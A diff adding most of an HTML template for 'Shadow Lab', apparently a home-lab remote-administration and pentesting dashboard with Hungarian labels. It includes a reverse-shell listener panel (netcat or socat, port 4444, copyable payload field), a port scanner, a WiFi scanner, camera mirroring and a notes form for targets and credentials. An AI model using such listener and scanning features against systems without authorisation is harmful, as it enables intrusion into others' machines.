+          <span id="radar-source-badge" style="font-size:.65rem;color:var(--muted);margin-left:6px;">—</span>
+        </div>
+        <div class="machine-host" id="radar-last-upd" style="font-size:.7rem;">—</div>
+      </div>
+      <span id="radar-badge" class="badge-off">OFFLINE</span>
+    </div>
+    <div class="card-body py-2">
+      <div class="row align-items-center g-2">
+        <div class="col-md-3 text-center">
+          <div id="radar-presence-icon" style="font-size:2rem;line-height:1.1;">❓</div>
+          <div id="radar-presence-label" style="font-size:.82rem;font-weight:700;color:var(--muted);">—</div>
+          <div id="radar-motion" style="font-size:.7rem;color:var(--muted);margin-top:2px;">—</div>
+        </div>
+        <div class="col-md-2 text-center">
+          <div id="radar-persons" style="font-size:2.2rem;font-weight:700;color:var(--blue);line-height:1;">—</div>
+          <div style="font-size:.68rem;color:var(--muted);">személy</div>
+        </div>
+        <div class="col-md-4">
+          <div style="display:flex;gap:20px;">
+            <div>
+              <div class="stat-label mb-1">LÉGZÉS</div>
+              <div style="display:flex;align-items:baseline;gap:3px;">
+                <span id="radar-breathing" style="font-size:1.3rem;font-weight:700;color:var(--green);">—</span>
+                <span style="font-size:.68rem;color:var(--muted);">bpm</span>
+              </div>
+              <div id="radar-breath-conf" style="font-size:.65rem;color:var(--muted);"></div>
+            </div>
+            <div>
+              <div class="stat-label mb-1">PULZUS</div>
+              <div style="display:flex;align-items:baseline;gap:3px;">
+                <span id="radar-heart" style="font-size:1.3rem;font-weight:700;color:var(--red);">—</span>
+                <span style="font-size:.68rem;color:var(--muted);">bpm</span>
+              </div>
+              <div id="radar-heart-conf" style="font-size:.65rem;color:var(--muted);"></div>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-3">
+          <div class="stat-label mb-1">JELERŐSSÉG</div>
+          <div style="display:flex;align-items:baseline;gap:3px;">
+            <span id="radar-rssi" style="font-size:1.1rem;font-weight:700;color:var(--yellow);">—</span>
+            <span style="font-size:.68rem;color:var(--muted);">dBm</span>
+          </div>
+          <div class="stat-label mt-2 mb-1">JELMINŐSÉG</div>
+          <div style="background:var(--border);border-radius:4px;height:6px;overflow:hidden;">
+            <div id="radar-quality-fill" style="height:100%;width:0%;background:var(--green);transition:width .4s;"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- KISMET_REMOVED -->
+<div class="container-fluid px-3 pb-2" style="display:none">
+  <div class="machine-card" id="kismet-card" style="border-color:var(--purple,#8b5cf6)44;">
+    <div class="card-head">
+      <div>
+        <div class="machine-label">
+          <span class="dot dot-off" id="kismet-dot"></span>📡 Kismet WiFi Scanner
+          <span id="kismet-iface" style="font-size:.65rem;color:var(--muted);margin-left:6px;">wlan0mon</span>
+        </div>
+        <div class="machine-host" id="kismet-last-upd" style="font-size:.7rem;">—</div>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center;">
+        <span id="kismet-pps" style="font-size:.72rem;color:var(--muted);">0 pkt/s</span>
+        <span id="kismet-badge" class="badge-off">OFFLINE</span>
+      </div>
+    </div>
+    <div class="card-body py-2">
+      <div class="row g-2 mb-2">
+        <div class="col-md-2 text-center">
+          <div id="kismet-total" style="font-size:2rem;font-weight:700;color:var(--blue);line-height:1;">—</div>
+          <div style="font-size:.68rem;color:var(--muted);">eszköz</div>
+        </div>
+        <div class="col-md-2 text-center">
+          <div id="kismet-aps" style="font-size:1.4rem;font-weight:700;color:var(--green);">—</div>
+          <div style="font-size:.68rem;color:var(--muted);">AP</div>
+        </div>
+        <div class="col-md-2 text-center">
+          <div id="kismet-clients" style="font-size:1.4rem;font-weight:700;color:var(--yellow);">—</div>
+          <div style="font-size:.68rem;color:var(--muted);">kliens</div>
+        </div>
+        <div class="col-md-3">
+          <div class="stat-label mb-1">CSOMAGOK</div>
+          <div style="display:flex;align-items:baseline;gap:3px;">
+            <span id="kismet-pkts" style="font-size:1.1rem;font-weight:700;color:var(--blue);">—</span>
+            <span style="font-size:.68rem;color:var(--muted);">összesen</span>
+          </div>
+        </div>
+        <div class="col-md-3">
+          <div class="stat-label mb-1">ADATFORRÁS</div>
+          <div id="kismet-src-status" style="font-size:.78rem;color:var(--green);">—</div>
+        </div>
+      </div>
+      <div id="kismet-devices-list" style="font-size:.75rem;border-top:1px solid var(--border);padding-top:6px;max-height:160px;overflow-y:auto;">
+        <div style="color:var(--muted);">Betöltés...</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /tab-monitor -->
+
+<!-- ══ TAB: Vezérlés ══ -->
+<div id="tab-control" class="tab-pane">
+<div class="container-fluid px-3 py-2">
+  <div class="row g-3">
+
+    <!-- WoL -->
+    <div class="col-12">
+      <div class="machine-card">
+        <div class="card-head"><span class="machine-label">⚡ Wake-on-LAN</span></div>
+        <div class="card-body"><div class="row g-2" id="wol-grid"></div></div>
+      </div>
+    </div>
+
+    <!-- Reverse shell listener -->
+    <div class="col-xl-4 col-lg-5">
+      <div class="machine-card h-100">
+        <div class="card-head">
+          <span class="machine-label" style="color:var(--red)">🎣 Reverse Shell Listener</span>
+        </div>
+        <div class="card-body">
+          <div class="d-flex gap-3 mb-2 flex-wrap align-items-end">
+            <div>
+              <div class="slabel">PORT</div>
+              <input type="number" id="rl-port" value="4444" min="1" max="65535"
+                style="width:80px;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:3px 6px;font-family:inherit;font-size:.82rem;">
+            </div>
+            <div>
+              <div class="slabel">ESZKÖZ</div>
+              <select id="rl-tool" style="background:var(--header);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:3px 8px;font-family:inherit;font-size:.78rem;">
+                <option value="nc">netcat (nc)</option>
+                <option value="socat">socat</option>
+              </select>
+            </div>
+            <div>
+              <button id="rl-start-btn" onclick="startListener()"
+                style="background:var(--red);border:none;color:#fff;border-radius:5px;padding:5px 14px;cursor:pointer;font-size:.78rem;font-weight:600;">▶ Indítás</button>
+              <button id="rl-stop-btn" onclick="stopListener()" style="display:none;background:transparent;border:1px solid var(--orange);color:var(--orange);border-radius:5px;padding:5px 12px;cursor:pointer;font-size:.78rem;">⏹ Stop</button>
+            </div>
+          </div>
+          <div style="font-size:.65rem;color:var(--muted);margin-bottom:6px;">
+            Payload:
+            <code id="rl-payload" onclick="copyRlPayload()" title="Kattints a másoláshoz"
+              style="color:var(--orange);background:#0d1117;padding:2px 7px;border-radius:3px;cursor:pointer;font-size:.68rem;"></code>
+          </div>
+          <div id="rl-term-wrap" style="background:#000;border-radius:6px;height:240px;overflow:hidden;"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Service manager -->
+    <div class="col-xl-8 col-lg-7">
+      <div class="machine-card h-100">
+        <div class="card-head" style="flex-wrap:wrap;gap:8px;">
+          <span class="machine-label">⚙️ Szolgáltatások</span>
+          <select id="svc-machine" onchange="loadServices()"
+            style="background:var(--header);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:3px 8px;font-family:inherit;font-size:.78rem;">
+            {% for mid, m in machines.items() %}{% if not m.get('type') == 'router' %}
+            <option value="{{mid}}">{{m.label}}</option>
+            {% endif %}{% endfor %}
+          </select>
+          <input id="svc-search" type="text" placeholder="🔍 szűrő..."
+            style="background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:3px 8px;font-family:inherit;font-size:.78rem;width:140px;"
+            oninput="filterServices()">
+          <button onclick="loadServices()" style="background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:4px;padding:2px 9px;cursor:pointer;font-size:.75rem;">↺</button>
+          <label style="font-size:.72rem;color:var(--muted);display:flex;align-items:center;gap:4px;cursor:pointer;">
+            <input type="checkbox" id="svc-all" onchange="loadServices()"> Mind
+          </label>
+          <span id="svc-count" style="font-size:.72rem;color:var(--muted);">—</span>
+        </div>
+        <div style="max-height:400px;overflow-y:auto;" id="svc-list">
+          <div style="padding:20px;text-align:center;color:var(--muted);">Válassz gépet</div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+</div><!-- /tab-control -->
+
+<!-- ══ TAB: Fájlok ══ -->
+<div id="tab-files" class="tab-pane">
+<div class="container-fluid px-3 py-2">
+  <div class="machine-card">
+    <div class="card-head" style="flex-wrap:wrap;gap:8px;">
+      <span class="machine-label">📁 Fájlböngésző</span>
+      <select id="fb-machine" onchange="fbNavigate('/home/wizardg')"
+        style="background:var(--header);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:3px 8px;font-family:inherit;font-size:.78rem;">
+        {% for mid, m in machines.items() %}{% if not m.get('type') == 'router' %}
+        <option value="{{mid}}">{{m.label}}</option>
+        {% endif %}{% endfor %}
+      </select>
+      <div class="d-flex align-items-center gap-1 flex-grow-1" style="font-size:.78rem;" id="fb-breadcrumb">
+        <span class="bc-part" onclick="fbNavigate('/')">/</span>
+      </div>
+      <label style="background:var(--green);color:#000;border-radius:5px;padding:3px 12px;cursor:pointer;font-size:.75rem;font-weight:600;">
+        ⬆ Feltöltés
+        <input type="file" id="fb-upload" style="display:none" multiple onchange="fbUpload(this)">
+      </label>
+      <button onclick="fbNavigate(fbCurrentPath())"
+        style="background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:4px;padding:2px 9px;cursor:pointer;font-size:.75rem;">↺</button>
+      <input type="hidden" id="fb-path" value="/home/wizardg">
+    </div>
+    <div id="fb-list" style="max-height:calc(100vh - 220px);overflow-y:auto;">
+      <div style="padding:30px;text-align:center;color:var(--muted);">Válassz gépet a böngészéshez</div>
+    </div>
+  </div>
+</div>
+</div><!-- /tab-files -->
+
+<!-- ══ TAB: Hálózat ══ -->
+<div id="tab-network" class="tab-pane">
+<div class="container-fluid px-3 py-2">
+  <div class="row g-3">
+
+    <!-- Ping mátrix -->
+    <div class="col-xl-4 col-lg-5">
+      <div class="machine-card h-100">
+        <div class="card-head" style="gap:8px;">
+          <span class="machine-label">📡 Ping mátrix</span>
+          <button onclick="loadPingMatrix()" style="background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:4px;padding:1px 8px;cursor:pointer;font-size:.75rem;">↺ Frissít</button>
+          <span id="pmat-status" style="font-size:.72rem;color:var(--muted);">—</span>
+        </div>
+        <div style="overflow-x:auto;" id="ping-matrix-wrap">
+          <div style="padding:20px;text-align:center;color:var(--muted);">Kattints Frissít-re</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Tailscale -->
+    <div class="col-xl-4 col-lg-4">
+      <div class="machine-card h-100">
+        <div class="card-head" style="gap:8px;">
+          <span class="machine-label" style="color:var(--purple);">🔒 Tailscale</span>
+          <button onclick="loadTailscale()" style="background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:4px;padding:1px 8px;cursor:pointer;font-size:.75rem;">↺ Frissít</button>
+        </div>
+        <div id="tailscale-wrap" style="max-height:480px;overflow-y:auto;">
+          <div style="padding:20px;text-align:center;color:var(--muted);">Kattints Frissít-re</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Hálózati térkép -->
+    <div class="col-xl-4 col-lg-3">
+      <div class="machine-card h-100">
+        <div class="card-head" style="gap:8px;">
+          <span class="machine-label">🗺️ Térkép</span>
+          <button onclick="loadNetTabMap()" style="background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:4px;padding:1px 8px;cursor:pointer;font-size:.75rem;">↺</button>
+        </div>
+        <div id="net-tab-map" style="height:440px;"></div>
+      </div>
+    </div>
+
+  </div>
+</div>
+</div><!-- /tab-network -->
+
+<!-- ══ TAB: Jegyzetek ══ -->
+<div id="tab-notes" class="tab-pane">
+<div class="container-fluid px-3 py-2">
+  <div class="row g-3">
+
+    <!-- Bal: lista -->
+    <div class="col-xl-3 col-lg-4">
+      <div class="machine-card" style="height:calc(100vh - 140px);display:flex;flex-direction:column;">
+        <div class="card-head" style="gap:8px;">
+          <span class="machine-label">📝 Jegyzeteim</span>
+          <button onclick="openNewNote()"
+            style="background:var(--green);border:none;color:#000;border-radius:4px;padding:1px 10px;cursor:pointer;font-size:.75rem;font-weight:600;">+ Új</button>
+        </div>
+        <div id="note-list" style="flex:1;overflow-y:auto;"></div>
+      </div>
+    </div>
+
+    <!-- Jobb: szerkesztő -->
+    <div class="col-xl-9 col-lg-8">
+      <div class="machine-card" style="height:calc(100vh - 140px);display:flex;flex-direction:column;">
+        <div class="card-head" style="gap:8px;">
+          <input id="note-key-input" type="text" placeholder="Cím / célpont (pl. 192.168.0.113, CTF-Web)..."
+            style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:4px 10px;font-family:inherit;font-size:.85rem;font-weight:600;">
+          <button onclick="saveNote()"
+            style="background:var(--blue);border:none;color:#fff;border-radius:5px;padding:4px 14px;cursor:pointer;font-size:.78rem;font-weight:600;">💾 Mentés</button>
+          <button onclick="deleteNote()" id="note-del-btn"
+            style="display:none;background:transparent;border:1px solid var(--red);color:var(--red);border-radius:5px;padding:4px 10px;cursor:pointer;font-size:.78rem;">🗑</button>
+          <span id="note-saved-lbl" style="font-size:.72rem;color:var(--green);display:none;">✓ Mentve</span>
+        </div>
+        <div class="card-body" style="flex:1;padding:8px;display:flex;flex-direction:column;">
+          <textarea id="note-editor"
+            style="flex:1;min-height:200px;"
+            placeholder="# Cím&#10;&#10;## Célpont&#10;IP: ...&#10;Port: ...&#10;&#10;## Eredmények&#10;...&#10;&#10;## Credentials&#10;user:pass"></textarea>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+</div><!-- /tab-notes -->
+
+<!-- CAMERAS_REMOVED -->
+<div id="tab-cameras" class="tab-pane" style="display:none!important">
+<div class="container-fluid px-3 py-2">
+
+  <!-- Fejléc -->
+  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;flex-wrap:wrap;gap:8px;">
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="font-size:.78rem;padding:3px 10px;border-radius:12px;background:#1a3a2a;border:1px solid #3fb95055;color:#3fb950;">📷 Eoolii kamerák — tablet tükrözés</span>
+      <span id="cam-live-count" style="font-size:.74rem;color:#3fb950;"></span>
+    </div>
+    <div style="display:flex;gap:6px;">
+      <button onclick="refreshAllCams()" style="background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:4px;padding:2px 12px;cursor:pointer;font-size:.78rem;">↺ Frissít</button>
+      <button onclick="toggleAllStreams()" id="all-stream-btn" style="background:transparent;border:1px solid #3fb950;color:#3fb950;border-radius:4px;padding:2px 12px;cursor:pointer;font-size:.78rem;">⏹ Stop</button>
+    </div>
+  </div>
+
+  <!-- Tablet stream -->
+  <div class="cam-card" style="max-width:900px;">
+    <div class="cam-card-head">
+      <span class="cam-card-label">📱 WIZZTAB — Eoolii kameranézet</span>
+      <div style="display:flex;gap:8px;align-items:center;">
+        <button onclick="snapCam('tab1')" title="Pillanatkép" style="background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:4px;padding:1px 10px;cursor:pointer;font-size:.75rem;">📸 Kép</button>
+        <button onclick="openCamFull('tab1','WIZZTAB — Eoolii')" style="background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:4px;padding:1px 10px;cursor:pointer;font-size:.75rem;">⛶ Teljes</button>
+        <span id="badge-tab1" class="cam-badge offline">● inaktív</span>
+      </div>
+    </div>
+    <div class="cam-card-body" style="min-height:400px;background:#000;">
+      <img id="stream-tab1" src="" alt="stream"
+           style="width:100%;height:auto;display:none;object-fit:contain;"
+           onload="camLoaded('tab1')" onerror="camError('tab1')">
+      <div id="placeholder-tab1" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:400px;color:var(--muted);">
+        <div style="font-size:3rem;">📱</div>
+        <div style="font-size:.85rem;margin-top:10px;">Betöltés...</div>
+      </div>
+    </div>
+    <div class="cam-footer" style="font-size:.75rem;">
+      <span style="color:var(--muted);">192.168.0.111</span>
+      <span style="color:var(--muted);margin-left:8px;">Eoolii app → 3 kamera</span>
+      <a href="/api/tablet_snapshot/tab1" target="_blank" style="color:var(--blue);margin-left:auto;">⬇ Snapshot letöltés</a>
+    </div>
+  </div>
+
+</div>
+</div><!-- /tab-cameras -->
+
+<!-- OSINT_REMOVED -->
+<div id="tab-osint" class="tab-pane" style="display:none!important">
+<div style="display:flex;flex-direction:column;height:calc(100vh - 90px);">
+  <div style="display:flex;align-items:center;justify-content:space-between;padding:6px 14px;background:var(--card);border-bottom:1px solid var(--border);flex-shrink:0;">
+    <span style="color:var(--blue);font-weight:700;font-size:.85rem;letter-spacing:1px;">🌍 OSIRIS — Global OSINT Dashboard</span>
+    <div style="display:flex;gap:8px;align-items:center;">
+      <span id="osiris-status" style="font-size:.75rem;color:var(--muted);">betöltés...</span>
+      <a href="http://localhost:3000" target="_blank" style="font-size:.75rem;color:var(--blue);text-decoration:none;border:1px solid var(--border);padding:2px 10px;border-radius:4px;">⤢ teljes képernyő</a>
+    </div>
+  </div>
+  <iframe id="osiris-frame" src="" style="flex:1;border:none;width:100%;background:#0d1117;" allow="geolocation *" loading="lazy"></iframe>
+</div>
+</div><!-- /tab-osint -->
+
+<div id="tab-siem" class="tab-pane" style="display:none!important">
+<div style="display:flex;flex-direction:column;height:calc(100vh - 90px);">
+  <div style="display:flex;align-items:center;justify-content:space-between;padding:6px 14px;background:var(--card);border-bottom:1px solid var(--border);flex-shrink:0;">
+    <span style="color:var(--blue);font-weight:700;font-size:.85rem;letter-spacing:1px;">🛡️ Wazuh SIEM — Security Dashboard</span>
+    <div style="display:flex;gap:8px;align-items:center;">
+      <span id="wazuh-status" style="font-size:.75rem;color:var(--muted);">betöltés...</span>
+      <a href="https://wazuh.lab" target="_blank" style="font-size:.75rem;color:var(--blue);text-decoration:none;border:1px solid var(--border);padding:2px 10px;border-radius:4px;">⤢ teljes képernyő</a>
+    </div>
+  </div>
+  <iframe id="wazuh-frame" src="" style="flex:1;border:none;width:100%;background:#0d1117;" loading="lazy"></iframe>
+</div>
+</div><!-- /tab-siem -->
+
+<!-- Teljes kamera modal -->
+<div id="cam-full-modal" style="display:none;position:fixed;inset:0;background:#000e;z-index:9999;align-items:center;justify-content:center;" onclick="closeCamFull()">
+  <div style="position:relative;max-width:95vw;max-height:95vh;">
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 10px;background:#161b22;border-radius:8px 8px 0 0;">
+      <span id="cam-full-title" style="color:#c9d1d9;font-size:.9rem;font-weight:600;"></span>
+      <button onclick="closeCamFull()" style="background:transparent;border:none;color:#8b949e;font-size:1.2rem;cursor:pointer;">✕</button>
+    </div>
+    <img id="cam-full-img" src="" style="max-width:95vw;max-height:88vh;display:block;object-fit:contain;border-radius:0 0 8px 8px;">
+  </div>
+</div>
+
+<script>
+// ── Tablet kamera stream (WIZZTAB) ────────────────────────────────────────
+let _tab1Active = false;
+
+function initCameras() {
+  startCamStream('tab1');
+}
+
+function startCamStream(cam) {
+  if (_tab1Active) return;
+  _tab1Active = true;
+  const img = document.getElementById('stream-' + cam);
+  img.src = '/api/tablet_stream/' + cam + '?' + Date.now();
+  img.style.display = 'block';
+  document.getElementById('placeholder-' + cam).style.display = 'none';
+}
+
+function camLoaded(cam) {
+  const b = document.getElementById('badge-' + cam);
+  if (b) { b.className = 'cam-badge live'; b.textContent = '● élő'; }
+  const lc = document.getElementById('cam-live-count');
+  if (lc) lc.textContent = 'élő';
+}
+
+function camError(cam) {
+  _tab1Active = false;
+  const b = document.getElementById('badge-' + cam);
+  if (b) { b.className = 'cam-badge offline'; b.textContent = '● inaktív'; }
+  document.getElementById('stream-' + cam).style.display = 'none';
+  const ph = document.getElementById('placeholder-' + cam);
+  ph.style.display = 'flex';
+  ph.innerHTML = '<div style="font-size:2.5rem;">📱</div><div style="font-size:.82rem;margin-top:8px;color:var(--muted);">Tablet nem elérhető — újrapróbálás 10s múlva</div>';
+  setTimeout(() => startCamStream(cam), 10000);
+}
+
+function snapCam(cam) {
+  window.open('/api/tablet_snapshot/' + cam + '?' + Date.now(), '_blank');
+}
+
+function refreshAllCams() {
+  _tab1Active = false;
+  const img = document.getElementById('stream-tab1');
+  img.src = ''; img.style.display = 'none';
+  document.getElementById('placeholder-tab1').style.display = 'flex';
+  setTimeout(() => startCamStream('tab1'), 500);
+}
+
+function toggleAllStreams() {
+  if (_tab1Active) {
+    _tab1Active = false;
+    const img = document.getElementById('stream-tab1');
+    img.src = ''; img.style.display = 'none';
+    document.getElementById('placeholder-tab1').style.display = 'flex';
+    document.getElementById('all-stream-btn').textContent = '▶ Összes stream';
+    document.getElementById('badge-tab1').className = 'cam-badge offline';
+    document.getElementById('badge-tab1').textContent = '● inaktív';
+  } else {
+    startCamStream('tab1');
+    document.getElementById('all-stream-btn').textContent = '⏹ Stop';
+  }
+}
+
+function openCamFull(cam, title) {
+  const modal = document.getElementById('cam-full-modal');
+  document.getElementById('cam-full-title').textContent = title;
+  document.getElementById('cam-full-img').src = '/api/tablet_stream/' + cam + '?' + Date.now();
+  modal.style.display = 'flex';
+}
+
+function closeCamFull() {
+  document.getElementById('cam-full-modal').style.display = 'none';
+  document.getElementById('cam-full-img').src = '';
+}
+</script>
+
+<footer>Shadow Lab © 2026 — <a href="/api/account" style="color:var(--accent);text-decoration:none;">{{ user.username }}</a> · <span style="color:{% if is_pro %}var(--accent){% else %}var(--muted){% endif %}">{{ user.tier|upper }}</span></footer>
+
+<!-- ── Add Machine Modal ── -->
+<div class="modal fade" id="addMachineModal" tabindex="-1">
+  <div class="modal-dialog modal-dialog-centered" style="max-width:420px;">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h6 class="modal-title" style="color:var(--accent);">◈ Add Machine</h6>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body" style="padding:16px 20px;">
+        <div id="add-machine-err" style="display:none;background:#f8514922;border:1px solid var(--red);border-radius:6px;color:var(--red);font-size:.78rem;padding:7px 12px;margin-bottom:12px;"></div>
+        <div style="display:grid;gap:10px;">
+          <div>
+            <div style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:3px;">Label *</div>
+            <input id="am-label" type="text" placeholder="e.g. Web Server"
+              style="width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:6px 10px;font-family:inherit;font-size:.85rem;outline:none;">
+          </div>
+          <div>
+            <div style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:3px;">Host / IP *</div>
+            <input id="am-host" type="text" placeholder="192.168.1.x or hostname"
+              style="width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:6px 10px;font-family:inherit;font-size:.85rem;outline:none;">
+          </div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+            <div>
+              <div style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:3px;">SSH User</div>
+              <input id="am-user" type="text" placeholder="username"
+                style="width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:6px 10px;font-family:inherit;font-size:.85rem;outline:none;">
+            </div>
+            <div>
+              <div style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:3px;">SSH Password</div>
+              <input id="am-pass" type="password" placeholder="••••••••"
+                style="width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:6px 10px;font-family:inherit;font-size:.85rem;outline:none;">
+            </div>
+          </div>
+          <div>
+            <div style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:3px;">MAC Address (for WoL)</div>
+            <input id="am-mac" type="text" placeholder="aa:bb:cc:dd:ee:ff"
+              style="width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:6px 10px;font-family:inherit;font-size:.85rem;outline:none;">
+          </div>
+          <label style="display:flex;align-items:center;gap:8px;font-size:.78rem;color:var(--text);cursor:pointer;">
+            <input id="am-local" type="checkbox" style="accent-color:var(--accent);"> This is the local machine
+          </label>
+        </div>
+      </div>
+      <div class="modal-footer" style="border-top:1px solid var(--border);padding:10px 20px;justify-content:space-between;">
+        <span id="am-limit-info" style="font-size:.7rem;color:var(--muted);">{% if is_pro %}Up to 10 machines{% else %}Up to 3 machines (free){% endif %}</span>
+        <button onclick="submitAddMachine()"
+          style="background:var(--accent);border:none;color:#fff;border-radius:6px;padding:6px 18px;cursor:pointer;font-size:.85rem;font-weight:600;">Add Machine</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ── Manage Machines (delete) ── -->
+<div class="modal fade" id="manageMachinesModal" tabindex="-1">
+  <div class="modal-dialog modal-dialog-centered" style="max-width:460px;">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h6 class="modal-title" style="color:var(--accent);">Machines</h6>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body p-0" id="manage-machine-list" style="max-height:380px;overflow-y:auto;"></div>
+      <div class="modal-footer" style="border-top:1px solid var(--border);padding:8px 16px;">
+        <button onclick="bootstrap.Modal.getInstance(document.getElementById('manageMachinesModal')).hide(); openAddMachine();"
+          style="background:var(--accent);border:none;color:#fff;border-radius:5px;padding:5px 14px;cursor:pointer;font-size:.78rem;font-weight:600;">+ Add New</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ── Upgrade Modal ── -->
+<div class="modal fade" id="upgradeModal" tabindex="-1">
+  <div class="modal-dialog modal-dialog-centered" style="max-width:360px;">
+    <div class="modal-content" style="text-align:center;">
+      <div class="modal-header justify-content-end" style="border:none;padding-bottom:0;">
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body" style="padding:10px 24px 28px;">
+        <div style="font-size:2rem;margin-bottom:10px;">◈</div>
+        <div style="font-size:1.2rem;font-weight:700;color:var(--accent);letter-spacing:2px;margin-bottom:8px;">SHADOW LAB PRO</div>
+        <div style="font-size:.82rem;color:var(--muted);margin-bottom:20px;">Unlock the full platform</div>
+        <div style="background:var(--header);border-radius:8px;padding:14px 16px;text-align:left;font-size:.78rem;line-height:2;margin-bottom:20px;">
+          <div>✓ <strong>SSH terminal</strong> — remote shell access</div>
+          <div>✓ <strong>Nmap scanner</strong> — built-in port scanner</div>
+          <div>✓ <strong>Process manager</strong> — view &amp; kill processes</div>
+          <div>✓ <strong>File browser</strong> — SFTP file manager</div>
+          <div>✓ <strong>Wake-on-LAN</strong> — remote power on</div>
+          <div>✓ <strong>Service control</strong> — systemd manager</div>
+          <div>✓ Up to <strong>10 machines</strong></div>
+        </div>
+        <div style="font-size:1.6rem;font-weight:700;color:var(--accent);margin-bottom:16px;">$9 <span style="font-size:.9rem;color:var(--muted);font-weight:normal;">/ month</span></div>
+        <button onclick="alert('Stripe checkout — coming soon!')"
+          style="width:100%;background:#7c3aed;border:none;color:#fff;border-radius:8px;padding:10px;cursor:pointer;font-size:.9rem;font-weight:700;letter-spacing:1px;">
+          Upgrade Now →
+        </button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SSH Modal -->
+<div class="modal fade" id="termModal" tabindex="-1">
+  <div class="modal-dialog modal-xl modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h6 class="modal-title"><i class="fas fa-terminal me-2"></i><span id="term-title">SSH Terminal</span></h6>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body">
+        <div id="term-wrap"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- QR modal -->
+<div class="modal fade" id="qrModal" tabindex="-1">
+  <div class="modal-dialog modal-sm modal-dialog-centered">
+    <div class="modal-content" style="text-align:center;">
+      <div class="modal-header justify-content-between">
+        <h6 class="modal-title" style="color:var(--purple);">📱 Mobil elérés</h6>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body" style="padding:20px;">
+        <div style="background:#fff;display:inline-block;padding:12px;border-radius:10px;margin-bottom:14px;">
+          <canvas id="qr-canvas"></canvas>
+        </div>
+        <div style="font-size:.8rem;color:var(--muted);margin-bottom:6px;">Tailscale URL:</div>
+        <div id="qr-url" style="font-size:.78rem;color:var(--blue);word-break:break-all;font-family:Consolas,monospace;background:var(--header);padding:6px 10px;border-radius:6px;cursor:pointer;" onclick="copyQrUrl()" title="Kattints a másoláshoz"></div>
+        <div id="qr-copied" style="font-size:.7rem;color:var(--green);margin-top:4px;display:none;">✓ Vágólapra másolva</div>
+        <div style="margin-top:12px;font-size:.7rem;color:var(--muted);">Csak Tailscale hálózaton elérhető</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Port scanner modal -->
+<div class="modal fade" id="scanModal" tabindex="-1">
+  <div class="modal-dialog modal-xl modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header" style="flex-wrap:wrap;gap:8px;">
+        <h6 class="modal-title" style="color:var(--red);">🌐 Port Scanner</h6>
+
+        <!-- Gyors célok -->
+        <div style="display:flex;gap:4px;flex-wrap:wrap;">
+          {% for mid, m in machines.items() %}
+          {% if not m.get('local', False) %}
+          <button onclick="setScanTarget('{{m.host}}')"
+            style="background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:4px;padding:1px 7px;cursor:pointer;font-size:.68rem;">
+            {{m.label}}
+          </button>
+          {% endif %}
+          {% endfor %}
+          <button onclick="setScanTarget('192.168.0.0/24')"
+            style="background:transparent;border:1px solid var(--purple);color:var(--purple);border-radius:4px;padding:1px 7px;cursor:pointer;font-size:.68rem;">
+            LAN /24
+          </button>
+        </div>
+
+        <input id="scan-target" type="text" placeholder="IP / hostname / CIDR"
+          style="background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:3px 10px;font-family:inherit;font-size:.82rem;width:190px;">
+
+        <select id="scan-type"
